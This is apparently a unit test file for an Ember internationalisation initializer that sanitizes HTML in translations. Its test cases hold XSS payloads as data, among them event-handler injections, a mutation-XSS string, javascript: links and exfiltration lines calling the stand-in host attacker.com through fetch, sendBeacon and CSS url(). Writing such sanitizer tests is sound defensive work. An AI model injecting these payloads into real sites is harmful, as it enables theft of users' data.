// @ts-ignore
import { initialize } from 'dummy/instance-initializers/override-intl';
import { module, test } from 'qunit';
import { setupTest } from 'ember-qunit';
import { type TestContext } from '@ember/test-helpers';
import { setupIntl } from 'ember-intl/test-support';
import { isHTMLSafe, htmlSafe } from '@ember/template';

module('Unit | Instance Initializer | override-intl', function (hooks) {
  setupTest(hooks);
  setupIntl(hooks, 'en-us');

  hooks.beforeEach(function () {
    initialize(this.owner);
    this.intlService = this.owner.lookup('service:intl');
  });

  module('when htmlSafe is true, it turns on the XSS Sanitization', () => {
    module('for malicious content in translations', () => {
      test('it sanitizes malicious attributes (e.g. onerror)', function (this: TestContext, assert) {
        const maliciousContent = '<img src=x onerror=alert(1)>';
        this.intlService.addTranslations('en-us', { xss_img: maliciousContent });

        const result = this.intlService.t('xss_img', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), '<img src="x">', 'malicious onerror attribute should be stripped');
      });

      test('it sanitizes malicious attributes (e.g. onclick)', async function (this: TestContext, assert) {
        const maliciousContent = '<code onclick="fetch(\'https://attacker.com/steal\')">Innocent text</code>';
        this.intlService.addTranslations('en-us', { xss_code: maliciousContent });

        const result = this.intlService.t('xss_code', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), '<code>Innocent text</code>', 'malicious onclick should be stripped');
      });

      test('it sanitizes malicious attributes (e.g. onmouseover)', async function (this: TestContext, assert) {
        const maliciousContent = '<code onmouseover="navigator.sendBeacon(\'https://attacker.com\')">Hover me</code>';
        this.intlService.addTranslations('en-us', { xss_code: maliciousContent });

        const result = this.intlService.t('xss_code', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), '<code>Hover me</code>', 'malicious onmouseover should be stripped');
      });

      test('it sanitizes mutation XSS (mXSS) with noscript tag', function (this: TestContext, assert) {
        const maliciousContent = '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>';
        this.intlService.addTranslations('en-us', { mxss: maliciousContent });

        const result = this.intlService.t('mxss', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), '<p></p>', 'malicious mXSS should be stripped');
      });

      module('for malicious attributes (e.g. style)', () => {
        test('it sanitizes malicious url', async function (this: TestContext, assert) {
          const maliciousContent =
            '<code style="background: url(\'https://attacker.com\')">This leaks data via CSS</code>';
          this.intlService.addTranslations('en-us', { xss_code: maliciousContent });

          const result = this.intlService.t('xss_code', { htmlSafe: true });

          assert.true(isHTMLSafe(result), 'result should be a SafeString');
          assert.strictEqual(
            result.toString(),
            '<code>This leaks data via CSS</code>',
            'unwanted url should be stripped'
          );
        });

        test('it sanitizes malicious encoded url', async function (this: TestContext, assert) {
          const maliciousContent =
            '<code style="background: \\75\\72\\6c(\'https://attacker.com\');">This leaks data via CSS</code>';
          this.intlService.addTranslations('en-us', { xss_code: maliciousContent });

          const result = this.intlService.t('xss_code', { htmlSafe: true });

          assert.true(isHTMLSafe(result), 'result should be a SafeString');
          assert.strictEqual(
            result.toString(),
            '<code>This leaks data via CSS</code>',
            'unwanted url should be stripped'
          );
        });

        test('it sanitizes malicious url in CSS variable', async function (this: TestContext, assert) {
          const maliciousContent =
            '<code style="--bg: url(\'https://attacker.com\'); background: var(--bg);">This leaks data via CSS</code>';
          this.intlService.addTranslations('en-us', { xss_code: maliciousContent });

          const result = this.intlService.t('xss_code', { htmlSafe: true });

          assert.true(isHTMLSafe(result), 'result should be a SafeString');
          assert.strictEqual(
            result.toString(),
            '<code>This leaks data via CSS</code>',
            'unwanted url should be stripped'
          );
        });

        test('it sanitizes CSS @font-face data exfiltration', function (this: TestContext, assert) {
          const maliciousContent = `<style>@font-face '{'font-family: leak;src: url('https://attacker.com/steal');'}'body '{'  font-family: leak; '}'</style>`;
          this.intlService.addTranslations('en-us', { css_leak: maliciousContent });

          const result = this.intlService.t('css_leak', { htmlSafe: true });

          assert.strictEqual(result.toString(), '', 'unwanted style should be stripped');
          assert.true(isHTMLSafe(result), 'result should be a SafeString');
        });
      });

      test('it removes script tags entirely', function (this: TestContext, assert) {
        const maliciousContent = 'Hello <script>alert("hacked")</script>World';
        this.intlService.addTranslations('en-us', { xss_script: maliciousContent });

        const result = this.intlService.t('xss_script', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), 'Hello World', 'script tag and its content should be removed');
      });

      module('in the links', () => {
        test('it sanitizes javascript: protocol', function (this: TestContext, assert) {
          const maliciousContent = '<a href="javascript:alert(1)">Click me</a>';
          this.intlService.addTranslations('en-us', { xss_js_link: maliciousContent });

          const result = this.intlService.t('xss_js_link', { htmlSafe: true });

          assert.true(isHTMLSafe(result), 'result should be a SafeString');
          assert.strictEqual(result.toString(), '<a>Click me</a>', 'javascript: protocol should be removed from href');
        });

        test('it sanitizes stylesheet that could contain malicious code', function (this: TestContext, assert) {
          const maliciousContent = '<link rel="stylesheet" href="https://attacker.com/">';
          this.intlService.addTranslations('en-us', { link_leak: maliciousContent });

          const result = this.intlService.t('link_leak', { htmlSafe: true });

          assert.true(isHTMLSafe(result), 'result should be a SafeString');
          assert.strictEqual(result.toString(), '', 'link tag should be removed entirely');
        });
      });

      test('it removes dangerous tags like iframe', function (this: TestContext, assert) {
        const maliciousContent = '<iframe src="https://evil.com"></iframe>';
        this.intlService.addTranslations('en-us', { xss_iframe: maliciousContent });

        const result = this.intlService.t('xss_iframe', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(result.toString(), '', 'iframe tag should be removed entirely');
      });

      test('it blocks complex multi-vector XSS attack', function (this: TestContext, assert) {
        const complexAttack = `<div style="background: \\75\\72\\6c('javascript:alert(1)'); @import url('https://attacker.com');"><img src=x onerror="alert('XSS')"><a href="javascript:alert(1)">Click</a><svg><animate onbegin="alert(1)" attributeName="x"/></svg><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object><iframe srcdoc="<script>alert(1)</script>"></iframe></div>`;

        this.intlService.addTranslations('en-us', { complex_xss: complexAttack });
        const result = this.intlService.t('complex_xss', { htmlSafe: true });

        assert.true(isHTMLSafe(result), 'result should be a SafeString');
        assert.strictEqual(
          result.toString(),
          '<div><img src="x"><a>Click</a></div>',
          'all malicious tags should be removed entirely'
        );
      });
    });

    test('it preserves valid HTML structure', function (this: TestContext, assert) {
      const safeContent = '<p>This is <b>Bold</b> and <i>Italic</i></p>';
      this.intlService.addTranslations('en-us', { rich_text: safeContent });

      const result = this.intlService.t('rich_text', { htmlSafe: true });

      assert.true(isHTMLSafe(result), 'result should be a SafeString');
      assert.strictEqual(result.toString(), safeContent, 'Safe HTML tags should be preserved');
    });

    test('it preserves the style attribute', function (this: TestContext, assert) {
      const styledContent = '<div style="background-color: red;">Red Box</div>';
      this.intlService.addTranslations('en-us', { styled: styledContent });

      const result = this.intlService.t('styled', { htmlSafe: true });

      assert.true(isHTMLSafe(result), 'result should be a SafeString');
      assert.strictEqual(result.toString(), styledContent, 'style attribute should be preserved');
    });

    test('it preserves the class attribute', function (this: TestContext, assert) {
      const classContent = '<span class="text-bold">Bold Text</span>';
      this.intlService.addTranslations('en-us', { klass: classContent });

      const result = this.intlService.t('klass', { htmlSafe: true });

      assert.true(isHTMLSafe(result), 'result should be a SafeString');
      assert.strictEqual(result.toString(), classContent, 'class attribute should be preserved');
    });

    test('it handles mixed valid and invalid content', function (this: TestContext, assert) {
      const mixedContent = '<div>Safe</div><script>Unsafe</script>';
      this.intlService.addTranslations('en-us', { mixed: mixedContent });

      const result = this.intlService.t('mixed', { htmlSafe: true });

      assert.strictEqual(result.toString(), '<div>Safe</div>', 'only valid content remains');
    });

    test('it sanitizes variables used in interpolation', function (this: TestContext, assert) {
      const translation = 'Welcome {name}, enjoy your stay.';
      const maliciousVariable = htmlSafe('<b>User</b><script>alert(1)</script>');
      this.intlService.addTranslations('en-us', { greeting: translation });

      const result = this.intlService.t('greeting', { name: maliciousVariable, htmlSafe: true });

      assert.true(isHTMLSafe(result), 'result should be a SafeString');
      assert.strictEqual(
        result.toString(),
        'Welcome <b>User</b>, enjoy your stay.',
        'Interpolated variables are sanitized correctly'
      );
    });
  });

  module('when htmlSafe is undefined/false, it keeps the default behavior', function () {
    test('it does NOT sanitize content by default', function (this: TestContext, assert) {
      const maliciousContent = '<script>alert(1)</script>';
      this.intlService.addTranslations('en-us', { raw: maliciousContent });

      const result = this.intlService.t('raw');

      assert.false(isHTMLSafe(result), 'result should NOT be a SafeString (it is a raw string)');
      assert.strictEqual(result, maliciousContent, 'Original content is returned unmodified (sanitization skipped)');
    });
  });
});
